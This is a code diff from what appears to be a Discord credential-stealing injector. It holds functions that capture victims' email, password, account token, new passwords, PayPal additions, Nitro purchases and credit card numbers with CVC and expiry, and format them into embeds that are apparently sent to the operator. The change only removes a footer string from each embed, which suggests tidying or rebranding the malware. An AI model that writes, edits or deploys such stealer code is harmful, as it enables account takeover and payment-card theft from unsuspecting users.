@@ -343,9 +343,6 @@ const login = async (email, password, token) => {
                     name: json.username + "#" + json.discriminator + " | " + json.id,
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                 },
-                footer: {
-                    text: wrap(config.stringspy, 50),
-                },
             },
         ],
     };
@@ -384,9 +381,6 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
                 author: {
                     name: json.username + "#" + json.discriminator + " | " + json.id,
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-                },
-                footer: {
-                    text: wrap(config.stringspy, 50),
                 },
             },
         ],
@@ -427,9 +421,6 @@ const emailChanged = async (email, password, token) => {
                     name: json.username + "#" + json.discriminator + " | " + json.id,
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                 },
-                footer: {
-                    text: wrap(config.stringspy, 50),
-                },
             },
         ],
     };
@@ -468,9 +459,6 @@ const PaypalAdded = async (token) => {
                 author: {
                     name: json.username + "#" + json.discriminator + " | " + json.id,
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-                },
-                footer: {
-                    text: wrap(config.stringspy, 50),
                 },
             },
         ],
@@ -516,9 +504,6 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
                 author: {
                     name: json.username + "#" + json.discriminator + " | " + json.id,
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-                },
-                footer: {
-                    text: wrap(config.stringspy, 50),
                 },
             },
         ],
@@ -566,9 +551,6 @@ const nitroBought = async (token) => {
                 author: {
                     name: json.username + "#" + json.discriminator + " | " + json.id,
                     icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-                },
-                footer: {
-                    text: wrap(config.stringspy, 50),
                 },
             },
         ],
